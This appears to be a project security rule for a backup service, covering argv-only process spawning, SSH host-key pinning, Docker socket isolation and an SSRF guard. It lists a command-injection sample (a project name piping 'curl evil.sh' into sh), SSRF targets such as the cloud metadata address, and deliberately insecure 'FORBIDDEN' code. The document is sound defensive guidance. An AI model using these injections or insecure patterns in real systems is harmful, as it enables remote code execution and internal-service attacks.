# Argv-Only Spawn + SSRF Guard (Surface #6) - Strict Rule

## MANDATORY REQUIREMENT - ZERO TOLERANCE

**Every `child_process.spawn` call in server AND agent code uses `shell: false`
with a **string[] argv**; never `shell: true`, never `child_process.exec`,
never a concatenated shell string. Secrets travel via `env`, never via
`args`. Every SSH invocation pins the host key
(`StrictHostKeyChecking=yes` + a pinned `UserKnownHostsFile`); no
`=no` / `=accept-new` / auto-add. The Docker socket is bind-mounted ONLY
into the least-privilege `docker-socket-proxy` container; the api reaches
Docker via `DOCKER_HOST=tcp://docker-socket-proxy:2375` — never a raw
`/var/run/docker.sock` mount, never `dockerode`. Every server-side
`fetch` that takes a user-supplied URL routes through
`shared/net/safe-fetch.ts::safeFetch`, which enforces (a) scheme
allowlist `http`/`https`, (b) IP blocklist for loopback / private /
link-local / cloud-metadata / IPv6 unique-local, (c) redirect
re-validation on every hop.**

See `prompts/dockstash-security/06-command-execution-ssrf-input-validation-opus-4.7.md`,
`docs/security-model.en.md` § "Command execution & SSRF", and
`prompts/SECURITY.md` § "6. COMMAND EXECUTION / SSRF / INPUT VALIDATION"
for the threat model.

## Why This Rule Exists

Four failure modes this rule blocks in one pattern:

1. **Shell metacharacter → RCE.** A project name `; curl evil.sh | sh` or a
   repo URL `sftp://host'$(id)'/p` concatenated into `sh -c` executes on the
   API host. `shell: false` with `argv: [...]` makes the same bytes an inert
   string argument to `restic`/`ssh`/`docker`.
2. **Host-key auto-accept.** `StrictHostKeyChecking=no` / `accept-new` accepts
   whatever key the storage host presents on first connect — a network
   attacker between the api and storage silently swaps in their key and
   observes/rewrites every backup byte. Pinning against
   `STORAGE_SSH_HOST_KEY_FINGERPRINT` closes the MITM window.
3. **Raw docker socket.** A bind-mount of `/var/run/docker.sock` into the api
   gives Docker root inside the api container. Any container-escape or code-
   injection bug becomes host root. The `docker-socket-proxy` allowlist
   scopes the api to `CONTAINERS`/`EXEC`/`INFO`/`ALLOW_RESTARTS`+`POST` only.
4. **SSRF via user URL.** `fetch(project.alertWebhookUrl)` without a
   scheme/IP guard lets a tenant point the API at
   `http://169.254.169.254/latest/meta-data/`, `http://docker-socket-proxy:2375`,
   `http://mongo:27017`, or `http://127.0.0.1:8080/api/superadmin/...` —
   arbitrary internal-service disclosure/attack. `safeFetch` resolves the
   host, rejects if any resolved IP is loopback/private/link-local/metadata,
   and re-validates on every redirect hop so a public 302 → loopback still
   fails.

## CORRECT

```ts
// argv-only spawn — secret via env, argv is a string[], shell: false
import { spawn } from 'node:child_process';
const child = spawn('restic', ['-r', repoUrl, 'backup', srcPath], {
  shell: false,
  env: { ...process.env, RESTIC_PASSWORD: password },
});
```

```ts
// SSH host key pinned — no auto-accept, fail closed if unset
if (!env.STORAGE_SSH_HOST_KEY_FINGERPRINT) {
  throw HttpError.failedDependency(t('errors.ssh.fingerprintMissing'));
}
spawn('sftp', [
  '-o', 'StrictHostKeyChecking=yes',
  '-o', `UserKnownHostsFile=${knownHostsPath}`,
  '-o', 'BatchMode=yes',
  `${user}@${host}`,
], { shell: false });
```

```ts
// SSRF guard — the ONLY way to fetch a user-supplied URL
import { safeFetch } from '../../shared/net/safe-fetch.js';
const response = await safeFetch(project.alertWebhookUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload),
});
```

## FORBIDDEN

```ts
// WRONG — shell interpretation. A crafted project name is RCE.
spawn('sh', ['-c', `restic -r ${repoUrl} backup ${srcPath}`], { shell: true });
spawn('restic', args, { shell: true });
exec(`restic -r ${repoUrl} backup ${srcPath}`);
```

```ts
// WRONG — secret in argv. Leaks via `ps` / `/proc/<pid>/cmdline`.
spawn('restic', ['-r', repoUrl, '--password', password], { shell: false });
```

```ts
// WRONG — host-key auto-accept.
spawn('sftp', ['-o', 'StrictHostKeyChecking=no',   ...], opts);
spawn('sftp', ['-o', 'StrictHostKeyChecking=accept-new', ...], opts);
```

```ts
// WRONG — raw docker socket mount in a service other than the proxy.
//   volumes:
//     - /var/run/docker.sock:/var/run/docker.sock:ro   ← api
//
// WRONG — dockerode / raw HTTP to /var/run/docker.sock from api code.
import Docker from 'dockerode';
const docker = new Docker({ socketPath: '/var/run/docker.sock' });
```

```ts
// WRONG — bare fetch on a user-supplied URL. SSRF.
await fetch(project.alertWebhookUrl, { ... });

// WRONG — following redirects transparently. The redirect target is
// unvalidated.
await fetch(url, { redirect: 'follow' });
```

## Contract

For every server-side and daemon-side spawn / SSH / Docker / fetch surface:

1. **argv-only spawn.** `spawn(bin, argsArray, { shell: false, env })`. The
   ESLint rule at `server/eslint.config.js` (and its `agent/` twin) fails
   the lint gate on `shell: true`; the meta-test at
   `server/src/shared/middleware/command-execution-meta.test.ts` fails the
   test gate on the same.
2. **No `child_process.exec` / `execSync` / `execFile`** in
   `server/src/modules/backups/**` or `agent/src/**`. The ESLint
   `no-restricted-imports` rule catches this at edit time.
3. **Secrets travel in `env`, never in argv** — `RESTIC_PASSWORD`,
   `SSH_ASKPASS`, etc.
4. **Host-key pinning.** `StrictHostKeyChecking=yes` + pinned
   `UserKnownHostsFile`. The ESLint config bans `=no` / `=accept-new` via
   `no-restricted-syntax`; the meta-test greps the whole tree.
5. **Socket-proxy only.** `/var/run/docker.sock` bind-mount appears in
   `docker-compose.yml` under `docker-socket-proxy` and NO OTHER service.
   The api sets `DOCKER_HOST=tcp://docker-socket-proxy:2375`. Enforced by
   the compose meta-test.
6. **SSRF guard on every user URL.** Any server-side `fetch` where the URL
   originates from a request body / project field / user setting must call
   `safeFetch`, which:
   - Rejects non-`http:` / `https:` schemes → `errors.ssrf.scheme`.
   - Resolves the host (v4 + v6) and rejects if any resolved IP is
     loopback / private / link-local / cloud-metadata /
     IPv6 unique-local → `errors.ssrf.private`.
   - Follows redirects manually (`redirect: 'manual'`) and re-validates
     every hop — a public URL that 302s to `127.0.0.1` still fails.
   - Caps the redirect chain at 5 hops → `errors.ssrf.tooManyRedirects`.
   - Fails a DNS-unknown host → `errors.ssrf.dnsFailed`.
7. **zod-everywhere.** Every mutating route validates its body/params/query
   with a zod schema declared in `*.schema.ts` before touching Mongoose or
   spawn. Never `as any`, never spread `req.body` into a Mongoose filter or
   argv element.

## Escape Hatch

None. A regression on any bullet above is a Critical finding, not a
judgment call.

## Validation

```bash
# STEP 5 preventive guards — green:
docker run --rm -v "$PWD/server":/app -w /app node:20-bookworm \
  npx vitest run src/shared/middleware/command-execution-meta.test.ts \
                 src/shared/net/safe-fetch.test.ts

# ESLint gate — no `shell: true`, no `exec` in backups/agent:
docker run --rm -v "$PWD/server":/app -w /app node:20-bookworm npm run lint
docker run --rm -v "$PWD/agent":/app  -w /app node:20-bookworm npm run lint

# Grep smoke tests (should all return nothing):
grep -rnE 'shell:\s*true'                          server/src agent/src
grep -rnE 'StrictHostKeyChecking=(no|accept-new)'  server/src agent/src
grep -rnE 'await fetch\('                          server/src/modules/alerting
```

## Checklist

- [ ] Every `spawn(...)` uses `shell: false` and a `string[]` argv.
- [ ] No `child_process.exec` / `execSync` / `execFile` in
      `server/src/modules/backups/**` or `agent/src/**`.
- [ ] Secrets travel via `env`, not `args`.
- [ ] `StrictHostKeyChecking=yes` everywhere; no `=no` / `=accept-new`.
- [ ] `/var/run/docker.sock` bind-mounted only into `docker-socket-proxy`.
- [ ] api uses `DOCKER_HOST=tcp://docker-socket-proxy:2375`.
- [ ] Every server-side user-URL fetch routes through `safeFetch`.
- [ ] Meta-tests at `command-execution-meta.test.ts` and
      `safe-fetch.test.ts` stay green.
- [ ] The ESLint gate stays green with the `no-restricted-syntax` and
      `no-restricted-imports` rules unchanged.
